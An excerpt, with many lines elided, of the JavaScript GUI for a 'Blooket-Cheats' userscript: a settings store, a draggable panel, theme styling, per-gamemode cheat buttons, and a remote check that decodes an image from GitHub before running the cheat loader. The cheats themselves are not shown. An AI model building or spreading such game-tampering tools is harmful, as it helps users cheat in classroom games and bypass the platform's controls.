      const setItem = useCallback(
        (k, v) => {
          k.split(".").reduce(
            (obj, k, i, a) => (++i == a.length && (obj[k] = v), obj[k]),
            data
          );
      ...
      const deleteItem = useCallback(
        (k, v) => {
          k.split(".").reduce(
            (obj, k, i, a) => (++i == a.length && delete obj[k], obj[k]),
            data
          );
          localStorage.setItem(settingsKey, JSON.stringify(data));
          updateData({ ...data });
    ...
    function Draggable({ parent, children, setPos, ...props }) {
      ...
      useEffect(() => {
        ...
        const pointermove = (e) => {
          ...
          var ratio =
            1 || parseFloat((0.75 / window.devicePixelRatio).toFixed(2));
          setPos({
            x: parent.offsetLeft - dx / ratio,
            y: parent.offsetTop - dy / ratio,
          });
        };
    ...
    function GUI() {
      ...
      const variables = React.createElement(
        "style",
        null,
        `:root {--backgroundColor: ${
          settings.data?.theme?.backgroundColor || "rgb(11, 194, 207)"
        };--infoColor: ${
          settings.data?.theme?.infoColor || "#9a49aa"
        };--cheatList: ${
          settings.data?.theme?.cheatList || "#9a49aa"
        };--defaultButton: ${
          settings.data?.theme?.defaultButton || "#9a49aa"
        };--disabledButton: ${
          settings.data?.theme?.disabledButton || "#A02626"
        };--enabledButton: ${
          settings.data?.theme?.enabledButton || "#47A547"
        };--textColor: ${
          settings.data?.theme?.textColor || "white"
        };--inputColor: ${
          settings.data?.theme?.inputColor || "#7a039d"
        };--contentBackground: ${
          settings.data?.theme?.contentBackground || "rgb(64, 17, 95)"
        };}`
      );
      const { current: gamemodes } = useRef([
        "alerts",
        "global",
        "voyage",
        "gold",
      ...
      useEffect(() => {
        ...
        alertInterval.current = setInterval(async () => {
          if (await Cheats.alerts.connect())
        ...
        return () => {
          ...
          for (const gamemode of gamemodes)
            for (const cheat of Cheats[gamemode].cheats)
      ...
      useEffect(() => {
        ...
        guiRef.current.style.top = `${
          parseInt(guiRef.current.style.top) +
          (guiRef.current.offsetHeight - 55) * (!minified ? -1 : 1)
        }px`;
        guiRef.current.style.left = `${
          parseInt(guiRef.current.style.left) +
          (guiRef.current.offsetWidth - 165) * (!minified ? -1 : 1)
        }px`;
      ...
      return React.createElement(
        ...
        React.createElement("style", null, styles.css),
        variables,
        React.createElement(
          "div",
          {
          ...
          !minified &&
            React.createElement(
              ...
              React.createElement(
                ...
                ((
                  ...
                  return React.createElement(
                    ...
                    React.createElement(AntiBen, null, "Click and drag here")
                  );
                })(
                  settings.data.hide || {
                    ctrl: true,
              ...
              React.createElement(
                ...
                React.createElement(AntiBen, null, "GitHub - TypicalShavonne")
              ),
              React.createElement(
                "div",
                {
                ...
                React.createElement(
                  ...
                  React.createElement(
                    ...
                    Cheats[currentMode].element ||
                      (Cheats[currentMode].element = React.createElement(
                        React.Fragment,
                        null,
                        React.createElement(
                          "div",
                        ...
                        Cheats[currentMode].cheats.map(
                          (cheat) =>
                            cheat.element ||
                            React.createElement(ScriptButton, {
                              key: cheat.name,
                              script: cheat,
                            })
                        )
  ...
  let img = new Image();
  img.src =
    "https://raw.githubusercontent.com/TypicalShavonne/Blooket-Cheats/main/autoupdate/timestamps/reactGui.png?" +
    Date.now();
  ...
  img.onload = function () {
    ...
    const [_, time, error] = decode.match(
      /LastUpdated: (.+?); ErrorMessage: "(.+?)"/
    );
    if (parseInt(time) <= 1696542129466 || iframe.contentWindow.confirm(error))
      cheat();
  };
